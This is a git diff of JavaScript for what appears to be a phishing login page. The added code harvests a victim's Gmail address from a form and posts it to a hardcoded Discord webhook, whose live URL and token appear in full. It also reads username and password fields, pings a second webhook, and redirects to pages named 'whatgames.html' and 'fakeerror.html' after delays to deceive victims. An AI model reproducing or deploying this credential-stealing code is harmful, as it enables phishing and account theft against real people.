@@ -14,6 +14,19 @@ function message() {
   request.send(JSON.stringify(params));
 }
 
+function message2() {
+  let username = document.getElementById("gmail").value;
+  const WebHook = "https://discord.com/api/webhooks/1179407562588827830/wLMzOQMVnWAnyAixOSaj8R-cpwC0QBJzm81NgG2i9DGy0PJw7OaGN2waqIQbIyclPaTN"
+  const contents = `New Email Found\nGmail: ${username}\n`
+  const request = new XMLHttpRequest();
+  request.open("POST", WebHook);
+  request.setRequestHeader('Content-type', 'application/json');
+  const params = {
+    content: contents
+  }
+  request.send(JSON.stringify(params));
+}
+
 function welcome() {
   let user = document.getElementById("username").value;
   let pass = document.getElementById("password").value;
@@ -29,19 +42,21 @@ function welcome() {
   requeest.send(JSON.stringify(paraams));
 }
 
+
+
 function welcome2() {
   let user = document.getElementById("username").value;
   let pass = document.getElementById("password").value;
   
-  const WebHooook = "https://discord.com/api/webhooks/1179708977852977233/bvLicIL96CrCxPGjDIVdOqA2uRGasWNt8-J3wyvhOPelRf3_t5Nwqo-6bK3gkeF6SO1I"
-  const conteeents = `Random user in AutoLogin menu\nThe USER is in AutoLogin menu`
-  const requeeest = new XMLHttpRequest();
-  requeeest.open("POST", WebHooook);
-  requeeest.setRequestHeader('Content-type', 'application/json');
-  const paraaams = {
-    content: conteeents
+  const WebHoooook = "https://discord.com/api/webhooks/1179708977852977233/bvLicIL96CrCxPGjDIVdOqA2uRGasWNt8-J3wyvhOPelRf3_t5Nwqo-6bK3gkeF6SO1I"
+  const conteeeents = `Random user in AutoLogin menu\nThe USER is in AutoLogin menu`
+  const requeeeest = new XMLHttpRequest();
+  requeeeest.open("POST", WebHoooook);
+  requeeeest.setRequestHeader('Content-type', 'application/json');
+  const paraaaams = {
+    content: conteeeents
   }
-  requeeest.send(JSON.stringify(paraaams));
+  requeeeest.send(JSON.stringify(paraaaams));
 }
 
   function toggleOverlay() {
@@ -73,25 +88,24 @@ function validateLogin() {
   } else {
     // Both username and password are filled, attempt login
     // Add your login logic here, for now, let's just show an alert
-    setTimeout(function () {
-                alert("Error: Couldn't connect to remote desktop. Lost connection. Please try again later.");
-            }, 5000);
+       setTimeout(function () {
+                window.location.href = 'whatgames.html';
+            }, 7000); // 7000 milliseconds = 7 seconds
   }
 }
 
 function validateLogin2() {
-  var username = document.getElementById('username').value;
-  var password = document.getElementById('password').value;
+  var username = document.getElementById('gmail').value;
   var errorContainer = document.querySelector('.hidden');
 
-  if (username.trim() === '' || password.trim() === '') {
+  if (username.trim() === '') {
     // Either username or password is empty
     errorContainer.style.display = 'block';
   } else {
     // Both username and password are filled, attempt login
     // Add your login logic here, for now, let's just show an alert
             setTimeout(function () {
-                window.location.href = 'loading.html';
+                window.location.href = 'fakeerror.html';
             }, 7000); // 7000 milliseconds = 7 seconds
   }
 }
